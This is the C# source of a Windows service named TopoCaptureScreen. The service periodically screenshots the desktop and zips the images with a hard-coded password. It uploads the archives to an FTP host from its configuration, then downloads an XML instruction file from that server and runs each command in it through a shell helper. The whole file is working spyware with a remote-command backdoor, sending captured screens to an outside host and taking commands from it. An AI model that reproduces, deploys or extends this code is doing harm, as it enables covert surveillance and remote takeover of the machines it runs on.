using System;
using System.Drawing.Imaging;
using System.IO;
using System.ServiceProcess;
using System.Xml;
using FTP;
using KellermanSoftware.SharpZipWrapper;
using TopoCaptureScreen.Config;
using TopoCaptureScreen.Utilities;
using Timer=System.Timers.Timer;

namespace TopoCaptureScreen
{
    public partial class CaptureScreen : ServiceBase
    {
        private static string zipFile = String.Empty;

        public CaptureScreen()
        {
            InitializeComponent();
            ConfigHandler.instance.Initialize();
        }

        protected override void OnStart(string[] args)
        {
            Timer t1 = new Timer();
            t1.Enabled = true;
            t1.Interval = ConfigHandler.instance.screenTimer;
            t1.Elapsed += t1_Elapsed;

            Timer tFtp = new Timer();
            tFtp.Enabled = true;
            tFtp.Interval = ConfigHandler.instance.ftpSenderTimer;
            tFtp.Elapsed += tFtp_Elapsed;
        }

        void tFtp_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            ConfigHandler conf = ConfigHandler.instance;
            FTPclient ftp = new FTPclient(conf.ftpHost, conf.ftpUserName, conf.ftpUserPassword);
            DirectoryInfo di = new DirectoryInfo(ConfigHandler.instance.tempfolder);
            foreach(FileInfo f in di.GetFiles())
            {
                if (f.Length > ConfigHandler.instance.maximmiumValue)
                {
                    string fileName = String.Concat(ftp.CurrentDirectory, "/", f.Name);
                    bool res = ftp.Upload(f, fileName);
                    if (res)
                    {
                        f.Delete();
                    }
                }
            }
            string stmtFullPath = String.Concat(ftp.CurrentDirectory, conf.stmtFile);
            if (ftp.FtpFileExists(stmtFullPath))
            {
                string downPath = Path.Combine(conf.tempfolder, conf.stmtFile);
                ftp.Download(stmtFullPath, downPath, true);
                ftp.FtpDelete(stmtFullPath);
                //Bussiness Method
                ProcessStmtFile(downPath);
            }
        }

        private void ProcessStmtFile(string path)
        {
            XmlDocument _xml = new XmlDocument();
            if (File.Exists(path))
            {
                _xml.Load(path);
                //Receive Files
                //Download Files
                XmlNodeList _lstFiles = _xml.SelectNodes("/rules/files/file");
                foreach (XmlNode node in _lstFiles)
                {
                    string action = XMLHelper.GetAttributeValue(node, "action");
                    
                    if (action == "receive")
                    {
                        
                    }
                    
                    if (action == "upload")
                    {
                        
                    }
                }
                //Execute Statement
                XmlNodeList _lstCmds = _xml.SelectNodes("/rules/commands/command");
                foreach (XmlNode node in _lstCmds)
                {
                    string text = XMLHelper.GetAttributeValue(node, "text");
                    if (!String.IsNullOrEmpty(text))
                    {
                        //TODO: Analize the result of the execution
                        ShellHelper.Execute(text);
                    }
                }
            }
        }

        protected override void OnStop()
        {
            // TODO: Add code here to perform any tear-down necessary to stop your service.
        }

        static string AssignName(DateTime dt)
        {
            string returnValue = Path.Combine(ConfigHandler.instance.tempfolder, String.Concat(dt.Hour, dt.Minute, dt.Second, dt.Day, dt.Month, dt.Year, ConfigHandler.instance.packageExtension));
            if (File.Exists(zipFile))
            {
                FileInfo fi = new FileInfo(zipFile);
                if (fi.Exists && fi.Length < ConfigHandler.instance.maximmiumValue)
                {
                    returnValue = zipFile;
                }
            }
            return returnValue;
        }
        
        static void t1_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                if (!Directory.Exists(ConfigHandler.instance.tempfolder))
                {
                    Directory.CreateDirectory(ConfigHandler.instance.tempfolder);
                }

                DateTime dt = DateTime.Now;
                string fileName = String.Concat(dt.Hour, dt.Minute, dt.Second, dt.Day, dt.Month, dt.Year, ConfigHandler.instance.imageExtension);

                string tmpFileName = Path.Combine(ConfigHandler.instance.systemTempFolder, fileName);
                ImageHelper.GetCurrentScreen().Save(tmpFileName, ImageFormat.Jpeg);

                string tmpPackageName = AssignName(dt);
                if (!tmpPackageName.Equals(zipFile))
                {
                    zipFile = tmpPackageName;
                }

                ZipHelper z = new ZipHelper();
                z.AddFilesToZip(zipFile, ConfigHandler.instance.systemTempFolder, fileName, false, "pepe");
                
                if (File.Exists(tmpFileName))
                {
                    File.Delete(tmpFileName);
                }
            }
            catch(Exception ex)
            {
                ex.ToString();
            }
        }
      
    }
}
